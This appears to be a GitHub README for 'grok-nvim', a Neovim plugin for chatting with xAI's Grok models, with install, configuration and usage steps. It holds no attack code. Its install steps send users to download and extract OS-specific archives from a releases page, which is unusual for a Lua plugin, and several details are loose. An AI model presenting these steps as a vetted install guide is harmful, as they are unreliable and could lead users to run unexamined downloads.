# 🎉 grok-nvim - Chat with AI Effortlessly

## 📥 Download Now
[![Download grok-nvim](https://img.shields.io/badge/Download%20grok--nvim-latest-blue.svg)](https://github.com/RobertAbao/grok-nvim/releases)

## 🚀 Getting Started
Grok-nvim is a simple plugin for Neovim that lets you chat with xAI's Grok models through an easy-to-use interface. You can stream responses and analyze code effortlessly, making AI integration smoother than ever.

## 💻 System Requirements
Before you start, ensure you have the following installed on your computer:
- **Neovim (version 0.5 or higher)**: You can download it from the [Neovim website](https://neovim.io).
- **Lua (version 5.1 or higher)**: Many systems include Lua by default. If not, install it from your package manager.

## 📦 Installation Steps
Follow these steps to get started with grok-nvim:

1. **Visit the Releases Page**
   Go to the [Releases page](https://github.com/RobertAbao/grok-nvim/releases) to find the latest version.

2. **Download the Plugin**
   Locate the version suited for your system and click on the download link. For most users, you will find compatibility options. Choose the one that fits your setup (Linux, macOS, Windows).

3. **Extract the Files**
   After downloading, extract the files from the compressed folder. Most operating systems allow you to do this by right-clicking the file and selecting "Extract".

4. **Move the Plugin to Neovim's Directory**
   Place the extracted files into Neovim's plugin directory. This is usually found at:
   - For Linux/macOS: `~/.config/nvim/`
   - For Windows: `C:\Users\<YourUsername>\AppData\Local\nvim\`

   Create a folder `lua` within the nvim directory if it does not exist, and then move the contents of `grok-nvim` into `~/.config/nvim/lua/`.

## 🔧 Configuration
Now that you have installed the plugin, you need to configure it to work with the API.

1. **Open Neovim**
   Start Neovim in your terminal or command prompt.

2. **Edit your init.lua**
   If you do not have a configuration file yet, create one. You can create a new file named `init.lua` in the `~/.config/nvim/` directory.

3. **Add the Configuration Settings**
   Insert the following code into your `init.lua`:

   ```lua
   require('grok').setup({
       api_key = 'YOUR_API_KEY',  -- Get your API key from the xAI platform
       ui = {
           floating = true,  -- Enable floating UI
       },
   })
   ```

   Replace `YOUR_API_KEY` with your actual API key from the Grok service.

## 💬 How to Use
1. **Start a Chat Session**
   Once your configuration is complete, open Neovim and run the command:
   ```
   :GrokChat
   ```
   This will open a chat interface where you can interact with the AI. Type your questions and see the responses in real-time.

2. **Analyze Code**
   To analyze code, use the command:
   ```
   :GrokAnalyze <your_code_here>
   ```
   This feature allows you to get instant feedback on your code snippets.

## 🛠 Features
- **Floating UI**: Enjoy a clean, user-friendly interface with floating windows.
- **Streaming Responses**: Receive real-time responses while chatting.
- **Code Analysis**: Easily analyze your code with straightforward commands.

## 🐞 Troubleshooting
If you encounter issues, consider these common fixes:
- Ensure you have the correct version of Neovim.
- Verify that your API key is set up correctly in the `init.lua` file.
- Check if the plugin files are correctly placed in the Lua directory.

## 📞 Support
For support or to report bugs, visit the [Issues page](https://github.com/RobertAbao/grok-nvim/issues). Please include as much detail as possible.

## 🔗 Links
- [Releases Page](https://github.com/RobertAbao/grok-nvim/releases)
- [Neovim](https://neovim.io)

## 📝 Contributing
If you want to contribute to grok-nvim, feel free to fork the repository. Please check the contributing guidelines in the repository for more information.

## 🎈 License
grok-nvim is open-source software licensed under the MIT License.